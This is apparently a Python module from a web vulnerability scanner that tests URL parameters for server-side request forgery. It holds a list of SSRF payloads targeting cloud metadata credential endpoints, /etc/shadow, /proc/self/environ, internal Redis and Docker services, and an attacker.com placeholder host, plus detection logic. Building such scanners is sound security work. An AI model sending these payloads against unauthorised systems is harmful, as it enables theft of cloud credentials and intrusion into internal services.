"""
scanner/web/ssrf.py
===================
Server-Side Request Forgery (SSRF) Scanner.

What is SSRF?
-------------
SSRF (CWE-918) allows an attacker to induce the server to make HTTP requests
to arbitrary destinations. This is particularly dangerous in cloud environments
where the instance metadata service (IMDS) is accessible from localhost.

Attack Scenarios
----------------
1. Cloud Metadata Theft  — http://169.254.169.254/latest/meta-data/
   AWS, GCP, Azure all expose instance credentials via IMDS.
   A single SSRF can leak IAM keys, enabling full cloud account takeover.

2. Internal Port Scanning — http://localhost:6379 (Redis), http://10.0.0.1/admin
   Server becomes a pivot point to reach internal services.

3. File Read via file:// — file:///etc/passwd
   Some libraries follow file:// URIs, leaking local filesystem content.

Detection Approach
------------------
- Inject SSRF payloads into URL parameters that appear to accept URLs /
  redirect destinations (heuristic parameter names).
- **Report only** when the response body contains **cloud metadata or
  credential-shaped material** (e.g. AWS ami-id + instance-id, AccessKeyId
  pairs, Azure/GCP metadata tokens). Generic keyword matches or internal
  banners alone do **not** produce findings.

OWASP: A10:2021 - Server-Side Request Forgery  CWE-918
"""

from ..scan_logger import logger
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── SSRF Payloads ─────────────────────────────────────────────────────────────
SSRF_PAYLOADS = [
    # ── Localhost variants ────────────────────────────────────────────────────
    "http://127.0.0.1",
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:8443/",
    "http://localhost",
    "http://localhost/",
    "http://localhost:80/",
    "http://0.0.0.0",
    "http://0.0.0.0/",
    "http://[::1]",
    "http://[::1]/",
    "http://[0:0:0:0:0:0:0:1]",

    # ── File read via SSRF ────────────────────────────────────────────────────
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "file:///windows/win.ini",
    "file://localhost/etc/passwd",

    # ── Protocol abuse ────────────────────────────────────────────────────────
    "gopher://127.0.0.1",
    "gopher://127.0.0.1:6379/_INFO",     # Redis
    "gopher://127.0.0.1:25/_EHLO",       # SMTP
    "dict://127.0.0.1:11211/stat",       # Memcached
    "sftp://attacker.com:22/",
    "tftp://attacker.com:69/TEST",
    "ldap://127.0.0.1:389/%0astats%0aquit",

    # ── AWS metadata ──────────────────────────────────────────────────────────
    "http://169.254.169.254",
    "http://169.254.169.254/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/meta-data/public-keys/",

    # ── GCP metadata ──────────────────────────────────────────────────────────
    "http://metadata.google.internal",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",

    # ── Azure metadata ────────────────────────────────────────────────────────
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",

    # ── Internal service detection ────────────────────────────────────────────
    "http://127.0.0.1:6379/",            # Redis
    "http://127.0.0.1:9200/",            # Elasticsearch
    "http://127.0.0.1:27017/",           # MongoDB
    "http://127.0.0.1:5432/",            # PostgreSQL
    "http://127.0.0.1:3306/",            # MySQL
    "http://127.0.0.1:11211/",           # Memcached
    "http://127.0.0.1:2375/version",     # Docker API
]

# ── Parameter Names Likely to Carry URLs ─────────────────────────────────────
SSRF_PRONE_PARAMS = {
    "url", "uri", "path", "file", "src", "source", "dest", "destination",
    "redirect", "return", "returnurl", "return_url", "next", "goto",
    "link", "href", "ref", "referrer", "resource", "image", "img",
    "document", "doc", "load", "fetch", "host", "server", "endpoint",
    "callback", "webhook", "proxy", "forward", "location", "target",
    "page", "feed", "data", "import", "include",
}

# ── Response Signatures Confirming SSRF ──────────────────────────────────────
SSRF_SIGNATURES = {
    "ami-id":                    "AWS IMDS - AMI metadata exposed",
    "instance-id":               "AWS/GCP IMDS - instance ID exposed",
    "security-credentials":      "AWS IAM credentials endpoint reached",
    "computeMetadata":           "GCP metadata service reached",
    "metadata/instance":         "Azure IMDS reached",
    "+PONG":                     "Redis server response (internal service reached)",
    "root:x:0:0":                "Local /etc/passwd file read via SSRF",
    "[fonts]":                   "Windows win.ini read via SSRF",
    "\"cluster_name\"":          "Elasticsearch reached (internal service)",
    "docker-compose":            "Docker API reached (critical - RCE possible)",
    "X-Consul-Index":            "Consul service mesh reached",
    "instanceType":              "Cloud IMDS metadata retrieved",
}


from ..base_scanner import BaseScanner
from .base_module import ScanContext


def _body_has_cloud_exfil_proof(body: str) -> bool:
    """
    True only when the response shows real cloud metadata and/or credential material
    (not a lone keyword, short reflection, or generic page).
    """
    if not body or len(body.strip()) < 80:
        return False
    low = body.lower()
    ami = "ami-id" in low
    iid = "instance-id" in low
    if ami and iid:
        return True
    if "accesskeyid" in low and "secretaccesskey" in low:
        return True
    if "accesskeyid" in low and "sessiontoken" in low:
        return True
    if "security-credentials" in low and "accesskeyid" in low:
        return True
    if "management.azure.com" in low and "access_token" in low:
        return True
    if "metadata/instance" in low and "access_token" in low:
        return True
    if "computemetadata" in low.replace(" ", ""):
        if any(
            k in low
            for k in ("instance/id", "instance-id", "project-id", "numeric-project-id")
        ):
            if "access_token" in low or "id_token" in low:
                return True
    return False


def _ssrf_metadata_evidence_summary(body: str) -> str:
    """Human-readable label when _body_has_cloud_exfil_proof is True."""
    low = body.lower()
    if "ami-id" in low and "instance-id" in low:
        return "AWS IMDS-style fields (ami-id and instance-id) in response body"
    if "accesskeyid" in low and "secretaccesskey" in low:
        return "AWS credential-shaped JSON (AccessKeyId / SecretAccessKey)"
    if "accesskeyid" in low and "sessiontoken" in low:
        return "AWS temporary credential material (AccessKeyId / SessionToken)"
    if "security-credentials" in low and "accesskeyid" in low:
        return "AWS security-credentials style response with AccessKeyId"
    if "metadata/instance" in low and "access_token" in low:
        return "Azure IMDS-style metadata with access_token"
    if "management.azure.com" in low and "access_token" in low:
        return "Azure management token material in response"
    if "computemetadata" in low.replace(" ", "") and "access_token" in low:
        return "GCP compute metadata with access_token"
    return "Cloud instance metadata or credential material in response body"


class SSRFScanner(BaseScanner):
    """
    Server-Side Request Forgery scanner.
    """
    name = "ssrf"

    def __init__(self, urls, threads=10, timeout=10, proxy=None, **kwargs):
        super().__init__(urls, threads=threads, timeout=timeout, proxy=proxy, **kwargs)

    def run(self, context: ScanContext) -> list[dict]:
        """Standard interface for controller execution."""
        self.urls = context.urls
        self.session = context.auth_session or context.session
        return self.scan()

    def scan(self):
        """Run SSRF scan across all discovered URLs."""
        findings = []
        parameterised = [u for u in self.urls if "?" in u]
        if not parameterised:
            logger.warning(
                "  [!] SSRF skipped — no URLs with query parameters (%s URLs in scope)",
                len(self.urls),
            )
            return findings
        logger.info(
            "  [*] Testing %s URL(s) with %s SSRF payloads",
            len(parameterised),
            len(SSRF_PAYLOADS),
        )
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = {ex.submit(self._test_url, u): u for u in parameterised}
            for f in as_completed(futs):
                try: findings.extend(f.result())
                except Exception: pass

        # ── Deduplicate: same path+param+type reported only once ────────────
        seen, deduped = set(), []
        for fi in findings:
            try:
                from urllib.parse import urlparse as _up
                base = _up(fi.get("url","")).path
            except Exception:
                base = fi.get("url","")
            key = (fi.get("url",""), fi.get("parameter",""), fi.get("type",""))
            if key not in seen:
                seen.add(key)
                deduped.append(fi)
        return deduped


    def _test_url(self, url):
        results = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        for param in params:
            # Only test params that look SSRF-prone OR all params on risky pages
            param_lower = param.lower()
            if param_lower not in SSRF_PRONE_PARAMS:
                continue

            for payload in SSRF_PAYLOADS:
                tp = {k: v[0] for k, v in params.items()}
                tp[param] = payload
                test_url = urlunparse(parsed._replace(query=urlencode(tp)))
                try:
                    # Short timeout for internal IPs — they never respond externally
                    _internal = any(x in payload for x in [
                        '127.0.0.1','localhost','0.0.0.0','169.254',
                        '[::1]','gopher://','6379','9200','27017','2375'
                    ])
                    _to = 2 if _internal else self.timeout
                    resp = self.session.get(test_url, timeout=_to,
                                            allow_redirects=True)
                    body = resp.text or ""
                    if not _body_has_cloud_exfil_proof(body):
                        sig = SSRFScanner._check_response(body, resp.status_code)
                        if sig:
                            logger.info(
                                "  [i] SSRF probe matched signature but no cloud metadata proof — skipped [%s]",
                                param,
                            )
                        continue
                    ev_text = _ssrf_metadata_evidence_summary(body)
                    results.append({
                        "type": "Server-Side Request Forgery (SSRF)",
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "severity": "CRITICAL",
                        "evidence": f"SSRF confirmed — {ev_text}",
                        "extra": {
                            "ssrf_imds_exfil_confirmed": True,
                            "ssrf_tier": "cloud_metadata_exfil",
                        },
                    })
                    logger.warning(
                        "  [CRITICAL] SSRF (metadata proof) -> %s [%s] %s",
                        url,
                        param,
                        payload[:40],
                    )
                    break
                except Exception:
                    continue
        return results

    @staticmethod
    def _check_response(body, status):
        """Check response body for SSRF confirmation signatures."""
        for sig, description in SSRF_SIGNATURES.items():
            if sig in body:
                return f"SSRF confirmed: {description} (signature: '{sig}')"
        return None
